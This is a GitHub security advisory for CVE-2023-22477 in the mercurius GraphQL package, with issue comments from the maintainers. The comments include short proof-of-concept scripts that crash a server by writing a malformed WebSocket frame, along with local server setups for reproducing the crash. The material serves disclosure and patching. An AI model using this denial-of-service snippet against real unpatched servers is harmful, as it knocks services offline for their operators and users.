| [@jonnydgreen](https://github.com/jonnydgreen) are you still using v8 in production? I will emit a security advisory saying that all versions before this are vulnerable.  Let me know if this needs a backport. |

# Uncaught Exception in mercurius when using subscriptions

Moderate

[mcollina](/mcollina)
published
GHSA-cm8h-q92v-xcfc
Jan 8, 2023

## Package

npm

mercurius
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

< 8.13.2; >= 9.0.0 < 11.5.0

## Patched versions

>= 8.13.2 < 9.0.0 >= 11.5.0

## Description

### Impact

Any users of Mercurius until version v11.5.0 are subjected to a denial of service attack by sending a malformed packet over WebSocket to `/graphql`.

### Patches

This was patched in [#940](https://github.com/mercurius-js/mercurius/pull/940).

The patch was released as v11.5.0 and v8.13.2.

### Workarounds

Disable subscriptions.

### References

Reported publicly as [#939](https://github.com/mercurius-js/mercurius/issues/939).

The same problem was solved in [fastify/fastify-websocket#228](https://github.com/fastify/fastify-websocket/pull/228)

### Severity

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L

### CVE ID

CVE-2023-22477

| It looks like the server crash in specific conditions. This is related to [#908](https://github.com/mercurius-js/mercurius/issues/908). I thought i solved it with [fastify/fastify-websocket#228](https://github.com/fastify/fastify-websocket/pull/228), but that's not completely true.  Before that PR, I was able to crash `mercurius` with:  ``` const WebSocket = require('ws');  const ws = new WebSocket('ws://127.0.0.1:1337/graphql');  ws.on('open', function open() {   ws._socket.write(Buffer.from([0xa2, 0x00])); });  ```  Now that's happening only specifying the websocket protocol. Given this server `index.js`:  ``` const Fastify = require('fastify') const mercurius = require('mercurius')  const schema = `   type Query {     add(x: Int, y: Int): Int   } `  const resolvers = {   Query: {     add: async (_, { x, y }) => x + y   } }  async function start() {     const fastify = Fastify()     fastify.register(mercurius, {         schema,         resolvers,         subscription: true     })      await fastify.listen({ port: 1337 }) }  start();  ```  I can crash it executing this script `crash_it.js` (see the second parameter of Websocket class):  ``` const WebSocket = require('ws');  const ws = new WebSocket('ws://127.0.0.1:1337/graphql', 'graphql-ws');  ws.on('open', function open() {   ws._socket.write(Buffer.from([0xa2, 0x00])); });  ``` |

| Last time it was an issue in `@fastify/websocket`, this time I'm not so sure. For comparison, if I remove `mercurius` from the equation, I was able to crash a standard fastify websocket server, now I'm not able anymore. Follow an example that was crashing before `@fastify/websocket@7.1.1`.  `crash_it.js`:  ``` const WebSocket = require('ws');  const ws = new WebSocket('ws://127.0.0.1:2000', 'graphql-ws');  ws.on('open', function open() {   ws._socket.write(Buffer.from([0xa2, 0x00])); });  ```  `index.js`:  ``` const Fastify = require('fastify') const fastifyWebsocket = require('@fastify/websocket')  async function start() {     const fastify = Fastify()     await fastify.register(fastifyWebsocket)      await fastify.listen({ port: 2000 }) }  start();  ``` |
